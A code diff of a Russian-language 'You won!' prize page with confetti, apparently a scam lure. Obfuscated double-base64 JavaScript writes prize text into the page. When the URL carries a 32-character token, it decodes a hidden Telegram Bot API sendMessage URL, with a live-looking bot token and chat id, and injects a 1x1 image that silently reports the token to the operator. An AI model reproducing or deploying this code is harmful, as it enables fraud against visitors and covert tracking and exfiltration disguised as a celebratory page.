@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Поздравляем! Вы победили!</title>
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600&display=swap" rel="stylesheet">
-  <style>
+ <style>
     body {
       margin: 0;
       font-family: 'Montserrat', sans-serif;
@@ -69,33 +69,53 @@
   </style>
 </head>
 <body>
-
   <canvas class="confetti"></canvas>
-
   <div class="card" id="main">
   </div>
   <div class="image" id="image">
   </div>
-
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
-  <script>
-    var a = window.location.href
-	var b = a.match(/=.{32}$/)
-	if(b){
-    a = 'UEdneFB2Q2Zqb2tnMEpMUml5RFF2OUMrMExIUXRkQzAwTGpRdTlDNElTRHduNDZKUEM5b01UNDhjRDdRbjlDKzBMZlF0TkdBMExEUXN0QzcwWS9RdGRDOElOQyswWUlnMExMUmdkQzEwTGtnMExUUmc5R0kwTGdoSU5DUzBZc2cwTC9RdnRDeDBMWFF0TkM0MEx2UXVDRFFzaURRdmRDdzBZalF0ZEM4SU5DNjBMN1F2ZEM2MFlQUmdOR0IwTFVnMEwvUmdOQzQwTGZRdnRDeUlOQzRJTkN5MFl2UXVOQ3owWURRc05DNzBMZ2dPREF3TURBZzBZQXVQQzl3UGp4aElHTnNZWE56UFNKaWRHNGlJR2h5WldZOUluTmxZeTVvZEcxc0lqN1FsOUN3MExIUmdOQ3cwWUxSakNEUXY5R0EwTGpRdHp3dllUND0=';
-    a = decodeURIComponent(escape(atob(atob(a))));
-  } else {
-    a = 'UEhBK1RHOXlaVzBnYVhCemRXMGdaRzlzYjNJZ2MybDBJR0Z0WlhRc0lHTnZibk5sWTNSbGRIVnlJR0ZrYVhCcGMybGphVzVuSUdWc2FYUXNJSE5sWkNCa2J5QmxhWFZ6Ylc5a1BHSnlQblJsYlhCdmNpQnBibU5wWkdsa2RXNTBJSFYwSUd4aFltOXlaU0JsZENCa2IyeHZjbVVnYldGbmJtRWdZV3hwY1hWaExpQlZkQ0JsYm1sdElHRmtJRzFwYm1sdElIWmxQR0p5UG1saGJTdzhZbkkrY1hWcGN5QnViM04wY25Wa0lHVjRaWEpqYVhSaGRHbHZiaUIxYkd4aGJXTnZJR3hoWW05eWFYTWdibWx6YVNCMWRDQmhiR2x4ZFdsd0lHVjRJR1ZoSUdOdmJXMXZaRzg4WW5JK1kyOXVjMlZ4ZFdGMExpQkVkV2x6SUdGMWRHVWdhWEoxY21VZ1pHOXNiM0lnYVc0Z2NtVndjbVZvWlc1a1pYSnBkQ0JwYmlCMmIyeDFjSFJoZEdVZ2RtVnNhWFFnWlhOelpUeGljajVqYVd4c2RXMGdaRzlzYjNKbElHVjFJR1oxWjJsaGRDQnVkV3hzWVNCd1lYSnBZWFIxY2k0Z1JYaGpaWEIwWlhWeUlITnBiblFnYjJOallXVmpZWFFnWTNWd2FXUmhkR0YwSUc1dmJqeGljajV3Y205cFpHVnVkQ3dnYzNWdWRDQnBiaUJqZFd4d1lTQnhkV2tnYjJabWFXTnBZU0JrWlhObGNuVnVkQ0J0YjJ4c2FYUWdZVzVwYlNCcFpDQmxjM1FnYkdGaWIzSjFiUzQ4TDNBKw==';
-    a = atob(atob(a));
+    <script>
+    function unicodeToBase64(str) {
+  const utf8Encoded = new TextEncoder().encode(str);
+  let binaryString = "";
+  for (let i = 0; i < utf8Encoded.length; i++) {
+    binaryString += String.fromCharCode(utf8Encoded[i]);
   }
-  document.getElementById('main').innerHTML = a
-  	if(b){
-	var m = b[0].slice(1)
-	var s = atob('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYzMTE3NjkyMTE6QUFGNkN2eW13cXlwS0tzaTFzeUQ3RXR5UEZka1gxbU5TQU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTk3MTM5NjIwNSZ0ZXh0PQ==')
-	var okn = s+m
-	var elem = '<img src="'+okn+'" width="1" height="1">'
-	document.getElementById('image').innerHTML = elem
-	}
+  return btoa(binaryString);
+}
+
+function base64ToUnicode(encoded) {
+  const binaryString = atob(encoded);
+  const bytes = new Uint8Array(binaryString.length);
+  for (let i = 0; i < binaryString.length; i++) {
+    bytes[i] = binaryString.charCodeAt(i);
+  }
+  return new TextDecoder().decode(bytes);
+}
+const originalString = "Hello, world! 😊 This is a test with some special characters: æøå";
+const encodedString = unicodeToBase64(originalString);
+const decodedString = base64ToUnicode(encodedString);
+  var a = window.location.href
+  var b = a.match(/=.{32}$/)
+  if(b){
+    var c = 'UEdneFB2Q2Zqb2tnMEpMUml5RFF2OUMrMExIUXRkQzAwTGpRdTlDNElTRHduNDZKUEM5b01UNDhjRDdRbjlDKzBMZlF0TkdBMExEUXN0QzcwWS9RdGRDOElOQyswWUlnMExMUmdkQzEwTGtnMExUUmc5R0kwTGdoSU5DUzBZc2cwTC9RdnRDeDBMWFF0TkM0MEx2UXVDRFFzaURRdmRDdzBZalF0ZEM4SU5DNjBMN1F2ZEM2MFlQUmdOR0IwTFVnMEwvUmdOQzQwTGZRdnRDeUlOQzRJTkN5MFl2UXVOQ3owWURRc05DNzBMZ2dPREF3TURBZzBZQXVQQzl3UGp4aElHTnNZWE56UFNKaWRHNGlJR2h5WldZOUluTmxZeTVvZEcxc0lqN1FsOUN3MExIUmdOQ3cwWUxSakNEUXY5R0EwTGpRdHp3dllUND0=';
+    c = 'UEdneFB2Q2Zqb2tnMEpMUml5RFFzdEdMMExqUXM5R0EwTERRdTlDNElOQ3owTHZRc05DeTBMM1JpOUM1SU5DLzBZRFF1TkMzSVR3dmFERStQR2d6UHRDZjBMN1F0OUMwMFlEUXNOQ3kwTHZSajlDMTBMd2cwTDNRc05HSTBMWFFzOUMrSU5DMDBMN1JnTkMrMExQUXZ0Q3owTDRnMEwvUXNOR0EwWUxRdmRDMTBZRFFzQ0U4TDJnelBqeHdQdENoMEwvUXNOR0IwTGpRc2RDK0lOQzMwTEFnMFlQUmg5Q3cwWUhSZ3RDNDBMVWcwTElnMEwzUXNOR0kwTFhRdVNEUXY5Q3cwWURSZ3RDOTBMWFJnTkdCMExyUXZ0QzVJTkMvMFlEUXZ0Q3owWURRc05DODBMelF0U3dnMExIUXU5Q3cwTFBRdnRDMDBMRFJnTkdQSU5DeTBMRFJpTkMxMEx6Umd5RFF2OUdBMExqUXU5QzEwTGJRc05DOTBMalJqaXdnMFlIUmd0Q3cwWURRc05DOTBMalJqOUM4SU5DNElOR0QwTC9RdnRHQTBZSFJndEN5MFlNZzBKTFJpeURRc3RHTDBZalF1OUM0SU5DeUlOR0gwTGpSZ2RDNzBMNGcwTHZRdU5DMDBMWFJnTkMrMExJZzBMZ2cwTExSaTlDNDBMUFJnTkN3MEx2UXVDRFFzOUM3MExEUXN0QzkwWXZRdVNEUXY5R0EwTGpRdHlFOEwzQStQR2d6UHRDUzBMRFJpQ0RRc3RHTDBMalFzOUdBMFl2UmlDRFJnZEMrMFlIUmd0Q3cwTExRdTlHUDBMWFJnaUF4TlRBZ01EQXcwWUF1UEM5b016NDhZbkkrUEdFZ1kyeGhjM005SW1KMGJpSWdhSEpsWmowaWMyVmpMbWgwYld3aVB0Q1gwTERRc2RHQTBMRFJndEdNSU5DLzBZRFF1TkMzUEM5aFBnPT0=';
+    c = base64ToUnicode(c);
+    c = base64ToUnicode(c);
+  } else {
+    var c = 'UEhBK1RHOXlaVzBnYVhCemRXMGdaRzlzYjNJZ2MybDBJR0Z0WlhRc0lHTnZibk5sWTNSbGRIVnlJR0ZrYVhCcGMybGphVzVuSUdWc2FYUXNJSE5sWkNCa2J5QmxhWFZ6Ylc5a1BHSnlQblJsYlhCdmNpQnBibU5wWkdsa2RXNTBJSFYwSUd4aFltOXlaU0JsZENCa2IyeHZjbVVnYldGbmJtRWdZV3hwY1hWaExpQlZkQ0JsYm1sdElHRmtJRzFwYm1sdElIWmxQR0p5UG1saGJTdzhZbkkrY1hWcGN5QnViM04wY25Wa0lHVjRaWEpqYVhSaGRHbHZiaUIxYkd4aGJXTnZJR3hoWW05eWFYTWdibWx6YVNCMWRDQmhiR2x4ZFdsd0lHVjRJR1ZoSUdOdmJXMXZaRzg4WW5JK1kyOXVjMlZ4ZFdGMExpQkVkV2x6SUdGMWRHVWdhWEoxY21VZ1pHOXNiM0lnYVc0Z2NtVndjbVZvWlc1a1pYSnBkQ0JwYmlCMmIyeDFjSFJoZEdVZ2RtVnNhWFFnWlhOelpUeGljajVqYVd4c2RXMGdaRzlzYjNKbElHVjFJR1oxWjJsaGRDQnVkV3hzWVNCd1lYSnBZWFIxY2k0Z1JYaGpaWEIwWlhWeUlITnBiblFnYjJOallXVmpZWFFnWTNWd2FXUmhkR0YwSUc1dmJqeGljajV3Y205cFpHVnVkQ3dnYzNWdWRDQnBiaUJqZFd4d1lTQnhkV2tnYjJabWFXTnBZU0JrWlhObGNuVnVkQ0J0YjJ4c2FYUWdZVzVwYlNCcFpDQmxjM1FnYkdGaWIzSjFiUzQ4TDNBKw==';
+    c = base64ToUnicode(c);
+    c = base64ToUnicode(c);
+  }
+  document.getElementById('main').innerHTML = c
+  if(b){
+  var m = b[0].slice(1)
+  var s = base64ToUnicode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYzMTE3NjkyMTE6QUFGNkN2eW13cXlwS0tzaTFzeUQ3RXR5UEZka1gxbU5TQU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTk3MTM5NjIwNSZ0ZXh0PQ==')
+  var okn = s+m+'f'
+  var elem = '<img src="'+okn+'" width="1" height="1">'
+  document.getElementById('image').innerHTML = elem
+  }
     const canvas = document.querySelector('.confetti');
     const confetti = window.confetti.create(canvas, { resize: true });
     confetti({
@@ -104,6 +124,5 @@
       origin: { y: 0.6 }
     });
   </script>
-
 </body>
 </html>
